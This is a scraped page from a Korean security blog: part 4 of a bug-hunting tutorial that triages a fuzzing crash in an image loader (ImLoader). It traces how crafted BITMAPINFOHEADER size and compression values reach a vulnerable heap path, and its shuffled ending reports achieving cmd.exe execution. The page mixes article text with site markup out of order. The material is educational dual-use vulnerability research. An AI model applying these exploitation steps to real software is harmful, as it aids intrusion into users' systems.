&lt;p&gt;&amp;#xC774;&amp;#xB807;&amp;#xAC8C; &lt;code&gt;cmd.exe&lt;/code&gt;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;!!! &amp;#xC9DD;&amp;#xC9DD;&amp;#xC9DD; &amp;#x314E;&amp;#x314E;&amp;#x314E;&amp;#x314E;&amp;#x314E;&amp;#x314E;&lt;/p&gt;
&lt;h1 id=&#34;&amp;#xADF8;&amp;#xC758;-&amp;#xACFC;&amp;#xAC70;&amp;#xC758;-&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;-&amp;#xC7A1;&amp;#xB2F4;&#34;&gt;&lt;a href=&#34;#&amp;#xADF8;&amp;#xC758;-&amp;#xACFC;&amp;#xAC70;&amp;#xC758;-&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;-&amp;#xC7A1;&amp;#xB2F4;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xADF8;&amp;#xC758; (&amp;#xACFC;&amp;#xAC70;&amp;#xC758;) &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xC7A1;&amp;#xB2F4;&#34;&gt;&lt;/a&gt;&amp;#xADF8;&amp;#xC758; (&amp;#xACFC;&amp;#xAC70;&amp;#xC758;) &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xC7A1;&amp;#xB2F4;&lt;/h1&gt;&lt;p&gt;&amp;#xC73C;&amp;#xC73C; &amp;#xB4DC;&amp;#xB514;&amp;#xC5B4; &amp;#xB05D;&amp;#xB0AC;&amp;#xB124;&amp;#xC694; &amp;#x314B;&amp;#x314B; &amp;#xC6D0;&amp;#xB798; 12 &amp;#xC6D4; &amp;#xC911;&amp;#xC21C;&amp;#xC778;&amp;#xAC00; &amp;#xB9D0;&amp;#xC778;&amp;#xAC00; &amp;#xC2DC;&amp;#xC791;&amp;#xD588;&amp;#xB294; &amp;#xB370; 1 &amp;#xC6D4;&amp;#xC5D0; &amp;#xBA58;&amp;#xD0C8;&amp;#xC774; &amp;#xB098;&amp;#xAC00; &amp;#xC788;&amp;#xC5B4; &amp;#xAC00;&amp;#xC9C0;&amp;#xACE0; &amp;#xC774;&amp;#xC81C;&amp;#xC57C; &amp;#xB05D;&amp;#xB0AC;&amp;#xB124;&amp;#xC694; &amp;#xD6C4;&amp;#xC6B0;&amp;#x2026; &amp;#xC5ED;&amp;#xC2DC; &amp;#xB098; &amp;#xC0C8;&amp;#xB07C;&amp;#xB294; &amp;#xAC8C;&amp;#xC73C;&amp;#xB978; &amp;#xB188;&amp;#x2026;.&lt;/p&gt;
&lt;p&gt;&amp;#xC6D0;&amp;#xB798; &amp;#xC774; &amp;#xAE00;&amp;#xC744; &amp;#xC4F4; &amp;#xC774;&amp;#xC720;&amp;#xAC00; &amp;#xB3D9;&amp;#xC544;&amp;#xB9AC; &amp;#xD6C4;&amp;#xBC30;&amp;#xB4E4; &amp;#xAD50;&amp;#xC721;&amp;#xC2DC;&amp;#xD0A4;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; &amp;#xAC83;&amp;#xB3C4; &amp;#xC788;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC0AC;&amp;#xC2E4; &amp;#xC804;&amp;#xC5D0; cdpython &amp;#xD615;&amp;#xC774; &amp;#xC774; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC73C;&amp;#xB85C; &amp;#xBC84;&amp;#xADF8;&amp;#xD5CC;&amp;#xD305; &amp;#xAE00; &amp;#xC4F0;&amp;#xBA74; &amp;#xC88B;&amp;#xC744; &amp;#xAC70; &amp;#xAC19;&amp;#xB2E4;&amp;#xACE0; &amp;#xD574;&amp;#xC11C; &amp;#xC4F0;&amp;#xAC8C; &amp;#xB410;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314B;&amp;#x314B; &amp;#xB9CE;&amp;#xC740; &amp;#xBD84;&amp;#xB4E4;&amp;#xC5D0;&amp;#xAC8C; &amp;#xB3C4;&amp;#xC6C0;&amp;#xC774; &amp;#xB418;&amp;#xC5C8;&amp;#xC73C;&amp;#xBA74; &amp;#xC88B;&amp;#xACA0;&amp;#xB124;&amp;#xC694;. &amp;#xC0AC;&amp;#xC2E4; &amp;#xC694;&amp;#xC998; &amp;#xB108;&amp;#xBB34; &amp;#xC798;&amp;#xD558;&amp;#xB294; &amp;#xC0AC;&amp;#xB78C;&amp;#xC774; &amp;#xB9CE;&amp;#xC544;&amp;#xC11C; &amp;#xC774;&amp;#xB7F0; &amp;#xAC70; &amp;#xBCF4;&amp;#xB294; &amp;#xC0AC;&amp;#xB78C;&amp;#xC774; &amp;#xC788;&amp;#xACA0;&amp;#xB0D0;&amp;#xB9CC;&amp;#xC740;&amp;#x2026; &amp;#xC798;&amp;#xD558;&amp;#xB294; &amp;#xC0AC;&amp;#xB78C;&amp;#xC740; &amp;#xC774;&amp;#xAC70; &amp;#xBCF4;&amp;#xC9C0;&amp;#xB3C4; &amp;#xC54A;&amp;#xACA0;&amp;#xC9C0;&amp;#x2026; &amp;#xC96C;&amp;#xB975; &amp;#xB098;&amp;#xB3C4; &amp;#xC774;&amp;#xC81C; &amp;#xC798;&amp;#xD574;&amp;#xC57C;&amp;#xC9C0;&amp;#x2026;. &amp;#x314B;&amp;#x314B;&amp;#x314B; &amp;#xADFC;&amp;#xB370; &amp;#xC77C;&amp;#xB2E8; &amp;#xC878;&amp;#xC5C5;&amp;#xBD80;&amp;#xD130; &amp;#xD558;&amp;#xC988;&amp;#xC544;&amp;#xC544;&amp;#xC544;&amp;#xC544; &amp;#x3160;&amp;#x3160;&amp;#x3160;&amp;#x3160;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB798;&amp;#xB3C4; &amp;#xC81C;&amp;#xAC00; &amp;#xC774; &amp;#xC815;&amp;#xB3C4;&amp;#xB77C;&amp;#xB3C4; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xAC8C; &amp;#xCC44;&amp;#xCC0D;&amp;#xC9C8; &amp;#xD574;&amp;#xC900; passket, combabo, cdpython, morinori89 &amp;#xD615;&amp;#xB4E4; &amp;#xAC10;&amp;#xC0AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2FC;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B; &amp;#xD6C4;&amp;#xC6B0;&amp;#x2026;. &amp;#xC0AC;&amp;#xC2E4; &amp;#xD615;&amp;#xB4E4;&amp;#xC774;&amp;#xB791; &amp;#xC81C;&amp;#xC77C; &amp;#xB9CE;&amp;#xC774; &amp;#xD55C; &amp;#xAC70;&amp;#xB294; &amp;#xD574;&amp;#xD0B9;&amp;#xBCF4;&amp;#xB2E4;&amp;#xB294; &amp;#xC220; &amp;#xCC98;&amp;#xBA39;&amp;#xB294; &amp;#xAC70; &amp;#xAC19;&amp;#xC9C0;&amp;#xB9CC;&amp;#x2026;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xBB38;&amp;#xC11C; &amp;#xD53C;&amp;#xB4DC;&amp;#xBC31; &amp;#xC900; SSG &amp;#xD6C4;&amp;#xBC30;&amp;#xB4E4; Frozenbeer &amp;#xB561;&amp;#xD050;&amp;#xB561;&amp;#xD050; &amp;#x314B;&amp;#x314B;&amp;#x314B;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xB2E4;&amp;#xB4E4; &amp;#xC990;&amp;#xD58C;!!!&lt;/p&gt;
 - hack &amp; life">
  <meta property="og:image" content="https://hackyboiz.github.io2021/03/31/l0ch/bughunting-tutorials-part4/image--076.png">
  <meta property="og:url" content="https://hackyboiz.github.io/">

  <link rel="canonical" href="https://hackyboiz.github.io/2021/03/31/l0ch/bughunting-tutorials-part4/">

  <title>[Research]   Part 4 - hackyboiz</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
  <link rel="stylesheet" href="/lib/hint/hint.min.css">

  
    
    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
  

  


<!--  -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
<link rel="stylesheet" href="/.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
<link rel="stylesheet" href="/.css">


<link rel="stylesheet" href="/css/main.css">

<!--  -->


  <script src="/js/utils.js"></script>
  <script src="/js/color-schema.js"></script>

<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
</head>


<body>
  <header style="height: 40vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-addrcard"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/author/">
                <i class="iconfont icon-user-fill"></i>
                Author
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              
  <div class="mt-3 post-meta">
    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
    <time datetime="2021-03-31 18:00" pubdate>
      2021 3 31 
    </time>
  </div>


<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      4.1k 
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      82
       
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2">
      <script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    </div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">[Research]   Part 4</h1>
                       
            <div class="markdown-body" id="post-body">
              <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
              <!-- hackyboiz_horizen_index -->
              <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-3672652207808168" data-ad-slot="8887862313" data-ad-format="auto" data-full-width-responsive="true"></ins>
              <script>
                   (adsbygoogle = window.adsbygoogle || []).push({});
              </script>
              <p><a href="https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/">&#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; Part 1</a></p>
<p><a href="https://hackyboiz.github.io/2021/03/17/l0ch/bughunting-tutorials-part2/">&#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; Part 2</a></p>
<p><a href="https://hackyboiz.github.io/2021/03/24/l0ch/bughunting-tutorials-part3/">&#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; Part 3</a></p>
<p>&#xC5B4;&#xB290;&#xB367; &#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; &#xAE00;&#xC785;&#xB2C8;&#xB2E4;. Part 3 &#xC5D0;&#xC11C; &#xBC14;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xB0B4;&#xC6A9;&#xC774;&#xB2C8; &#xAE34;&#xB9D0; &#xC5C6;&#xC774; &#xBC14;&#xB85C; &#xC2DC;&#xC791;&#xD574;&#xBCFC;&#xAC8C;&#xC694;!</p>
<hr>
<p>&#xC774;&#xC81C;&#xBD80;&#xD130;&#xB294; &#xCF5C; &#xC2A4;&#xD0DD;&#xC744; &#xBCF5;&#xAD6C;&#xD574;&#xBCFC; &#xAC81;&#xB2C8;&#xB2E4;. &#xCF5C; &#xC2A4;&#xD0DD;&#xC744; &#xBCF5;&#xAD6C;&#xD558;&#xBA74; &#xC6B0;&#xB9AC;&#xAC00; &#xC5B4;&#xB290; &#xC815;&#xB3C4;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xBD10;&#xC57C; &#xD558;&#xB294;&#xC9C0; &#xC0AC;&#xC774;&#xC988;&#xAC00; &#xB098;&#xC635;&#xB2C8;&#xB2E4;. &#xC774;&#xAC78; &#xBCF5;&#xAD6C;&#xD558;&#xACE0; &#xC5B4;&#xB290; &#xBD80;&#xBD84;&#xBD80;&#xD130; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xC88B;&#xC744;&#xC9C0;&#xB97C; &#xD310;&#xB2E8;&#xD560; &#xAC81;&#xB2C8;&#xB2E4;.</p>
<p>&#xCF5C; &#xC2A4;&#xD0DD;&#xC744; &#xBCF5;&#xAD6C;&#xD558;&#xB294; &#xBC29;&#xBC95; &#xC5ED;&#xC2DC; &#xC704;&#xC5D0;&#xC11C; &#xC544;&#xB798;&#xB85C;(&#xD0D1;&#xB2E4;&#xC6B4;) &#xC544;&#xB798;&#xC5D0;&#xC11C; &#xC704;&#xB85C;(&#xBC14;&#xD140;&#xC5C5;) &#xBB58; &#xC5B4;&#xB5BB;&#xAC8C; &#xD558;&#xB358; &#xC0C1;&#xAD00;&#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB0E5; &#xC790;&#xC2E0;&#xC774; &#xD3B8;&#xD558;&#xC2E0; &#xB300;&#xB85C; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xBC14;&#xD140;&#xC5C5; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD560; &#xB54C;&#xC5D0;&#xB294; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xD568;&#xC218;&#xC758; &#xCC98;&#xC74C; &#xBD80;&#xBD84;&#xC5D0; &#xBE0C;&#xB808;&#xC774;&#xD06C; &#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xAC78;&#xC5B4;&#xC11C; &#xBC14;&#xB85C; &#xC9C1;&#xC804;&#xC758; &#xB9AC;&#xD134; &#xC5B4;&#xB4DC;&#xB808;&#xC2A4;&#xB97C; &#xBCF4;&#xBA74;&#xC11C; &#xD558;&#xB098;&#xD558;&#xB098; &#xC62C;&#xB77C;&#xAC00;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xD0D1;&#xB2E4;&#xC6B4; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD560; &#xACBD;&#xC6B0; &#xB3D9;&#xC801; &#xB514;&#xBC84;&#xAE45;&#xACFC; &#xC815;&#xC801; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC801;&#xC808;&#xD788; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; &#xC81C;&#xC77C; &#xC704;(&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xD568;&#xC218;)&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xC778;&#xC790;&#xB97C; &#xBCF4;&#xACE0; &#xBA3C;&#xC800; &#xC815;&#xC801; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xACB0;&#xACFC;&#xB4E4;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB3D9;&#xC801; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xAC19;&#xC774; &#xC218;&#xD589;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p>
<p>&#xB098;&#xB294; &#xC544;&#xBB34; &#xC0DD;&#xAC01;&#xC774; &#xC5C6;&#xB2E4;!!! &#xADF8;&#xB0E5; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xCD5C;&#xB300;&#xD55C; &#xC904;&#xC774;&#xACE0; &#xC2F6;&#xC5B4;&#xC694;!!! &#xC2DC;&#xAC04;&#xC740; &#xB9CE;&#xC544;&#xC694;!!!(&#xB294; &#xAC1C;&#xBFD4; &#xC81C;&#xB85C;&#xB370;&#xC774;&#xB294; &#xBB35;&#xD788;&#xBA74; &#xB625; &#xB429;&#xB2C8;&#xB2E4;)&#xB77C;&#xACE0; &#xD558;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xC740; &#xADF8;&#xB0E5; &#xC81C;&#xC77C; &#xC704;&#xC5D0; &#xC788;&#xB294; &#xD568;&#xC218;&#xC5D0;&#xC11C; p &#xB204;&#xB974;&#xACE0; &#xD06C;&#xB798;&#xC2DC; &#xD130;&#xC9C0;&#xBA74; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC7AC;&#xC2DC;&#xC791;&#xD558;&#xACE0; &#xADF8; &#xC2DC;&#xC810;&#xC73C;&#xB85C; &#xAC00;&#xC11C; &#xB2E4;&#xC2DC; p &#xB204;&#xB974;&#xACE0;&#x2026; &#xC774;&#xB807;&#xAC8C; &#xCB49;&#xCB49; &#xB0B4;&#xB824;&#xAC00;&#xB294; &#xBC29;&#xBC95;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB34;&#xC2DD;&#xD558;&#xC9C0;&#xB9CC; &#xD655;&#xC2E4;&#xD558;&#xAE30;&#xB3C4; &#xD558;&#xC8E0;&#x2026;. &#xB294; &#xC2DC;&#xAC04; &#xB0AD;&#xBE44; &#xAC1C;&#xCA54;&#x2026; &#xC2A4;&#xB808;&#xB4DC; &#xC798;&#xBABB; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xB9AC;&#xC5BC; &#xC2DC;&#xAC04; &#xB0AD;&#xBE44;&#x2026; (&#xC2A4;&#xB808;&#xB4DC;&#xB294; &#xD799;&#xC744; &#xACF5;&#xC720;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; &#xC2A4;&#xB798;&#xB4DC;&#xAC00; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD799;&#xC5D0;&#xC11C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC2A4;&#xB808;&#xB4DC; &#xB9D0;&#xACE0; &#xB2E4;&#xB978; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0;&#xC11C;&#xB3C4; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;)&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B; &#xBB50; &#xADF8;&#xB798;&#xB3C4; &#xC774;&#xAC83;&#xB9CC;&#xD07C; &#xC0DD;&#xAC01; &#xC5C6;&#xC774; &#xD558;&#xB294; &#xAC74; &#xC5C6;&#xB294; &#xAC70; &#xAC19;&#xB124;&#xC6AC;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B; (&#xC9C0;&#xADF9;&#xD788; &#xCF5C; &#xC2A4;&#xD0DD; &#xBCF5;&#xAD6C;&#xC5D0;&#xB9CC; &#xD574;&#xB2F9;&#xB418;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;&#x2026; &#xACB0;&#xAD6D;&#xC740; &#xB2E4; &#xBD84;&#xC11D;&#xD574;&#xC57C; &#xB3FC;&#xC694; &#x3160;&#x3160;)</p>
<p>&#xCF5C; &#xC2A4;&#xD0DD;&#xC744; &#xBCF5;&#xAD6C;&#xD558;&#xACE0; &#xCC9C;&#xCC9C;&#xD788; &#xB530;&#xB77C;&#xB2E4;&#xAC00; &#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>ImLoader+0x27BB0</code> &#xC5D0;&#xC11C; &#xD5E4;&#xB354; &#xAC80;&#xC0AC;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBC1C;&#xACAC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. (&#xCEA1;&#xCC98; &#xC0AC;&#xC9C4;&#xC758; &#xD5E5;&#xC2A4;&#xB808;&#xC774; &#xCF54;&#xB4DC;&#xB294; &#xC544;&#xC774;&#xB2E4; &#xBC84;&#xC804;&#xC5D0; &#xB530;&#xB77C; &#xC870;&#xAE08;&#xC529; &#xB2E4;&#xB97C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;)</p>
<p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--048.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--048.png"></p>
<p><code>v7</code>&#xC5D0; &#xC788;&#xB294; &#xAC12;&#xC774; <code>MB</code>(&#xC22B;&#xC790;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC11C; &#xC55E;&#xC5D0;&#xC11C; &#xBABB; &#xCC3E;&#xC740; &#xAC70;&#xB124;&#xC694;)&#xC778;&#xC9C0; &#xBE44;&#xAD50;&#xD558;&#xACE0; &#xD2C0;&#xB9AC;&#xBA74; &#xC775;&#xC149;&#xC158;&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xACE0; &#xB9DE;&#xB2E4;&#xBA74; &#xD574;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; <code>sub_427620</code> &#xC5D0;&#xC11C; &#xD30C;&#xC77C; &#xD574;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xBA74;&#xC11C; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xACA0;&#xB124;&#xC694;!!</p>
<p>&#xADF8;&#xB7FC; &#xC774;&#xC81C;&#xBD80;&#xD130;&#xB294; &#xC2E4;&#xC81C; &#xD30C;&#xC77C;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xD568;&#xC218;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xC9C4;&#xD589;&#xB418;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCFC;&#xAC8C;&#xC694;.</p>
<p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--050.jpg" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--050.jpg"></p>
<p>&#xBA3C;&#xC800; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xC5B4; &#xC628; Stream &#xAC12;&#xC744; &#xD1B5;&#xD574; <code>BITMAPINFOHEADER</code> &#xC758; &#xC0AC;&#xC774;&#xC988;&#xB97C; &#xAC00;&#xC838;&#xC640;&#xC11C; &#xC9C0;&#xC5ED;&#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xB2F9;&#xC5F0;&#xD788; &#xC6B0;&#xB9AC;&#xAC00; &#xC218;&#xC815;&#xD55C; <code>0x1f28</code> &#xC774;&#xACA0;&#xC8E0;? &#xADF8;&#xB7F0; &#xB2E4;&#xC74C; <code>0x1f28+0x40c</code> &#xB9CC;&#xD07C; <code>BITMAPINFOHEADER</code> &#xB97C; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD574;&#xC8FC;&#xACE0; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB97C; header&#xC5D0; &#xC800;&#xC7A5;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>size</code> &#xC640; <code>0xc</code> &#xAC00; &#xAC19;&#xC740; &#xC9C0; &#xBE44;&#xAD50;&#xB97C; &#xD574;&#xC11C; &#xACB0;&#xACFC; &#xAC12;&#xC744; <code>size_bool</code> &#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>size</code> &#xB294; <code>0x1f28</code> &#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>size_bool</code>&#xC5D0;&#xB294; 0 &#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xBC11;&#xC5D0; &#xBD84;&#xAE30;&#xC810;&#xC5D0;&#xC11C; <code>size_bool</code> &#xC774; <code>0</code> &#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>else</code>&#xB85C; &#xBE60;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--052.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--052.png"></p>
<p><code>else</code>&#xB85C; &#xBE60;&#xC9C0;&#xAC8C; &#xB418;&#xBA74; &#xD30C;&#xC77C;&#xC758; <code>BITMAPINFOHEADER</code> &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xBD80;&#xD130; <code>size</code>&#xB9CC;&#xD07C; &#xC77D;&#xC5B4;&#xC640;&#xC11C; header&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC55E;&#xC5D0;&#xC11C; <code>size+0x40c</code> &#xB9CC;&#xD07C; &#xD560;&#xB2F9;&#xC744; &#xD588;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
<p>&#xADF8;&#xB7F0; &#xB2E4;&#xC74C;, compression&#xC5D0; &#xB300;&#xD55C; &#xBD84;&#xAE30;&#xBB38;&#xC744; &#xB9CC;&#xB098;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xAC12;&#xC740; <code>0x00</code> &#xC5D0;&#xC11C; <code>0xa00</code>&#xC73C;&#xB85C; &#xC218;&#xC815;&#xD588;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; &#xBD84;&#xAE30;&#xB85C; &#xB4E4;&#xC5B4;&#xAC08; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xBD84;&#xAE30;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xBA74; &#xCCAB; &#xBC88;&#xC9F8;&#xB85C; &#xD558;&#xB294; &#xC77C;&#xC774; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xB124;&#xC694;. &#xADF8;&#xB7FC; <code>BITMAPINFOHEADER</code> &#xAC00; &#xD560;&#xB2F9;&#xB41C; &#xB4B7;&#xBD80;&#xBD84;&#xC5D0; &#xD560;&#xB2F9;&#xC774; &#xB418;&#xACA0;&#xB124;&#xC694;.(<code>BITMAPINFOHEADER</code> &#xAC00; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xD558;&#xB098; &#xB354; &#xD560;&#xB2F9;&#xD560; &#xB9CC;&#xD07C; &#xD06C;&#xC9C8; &#xC54A;&#xC73C;&#xB2C8;) 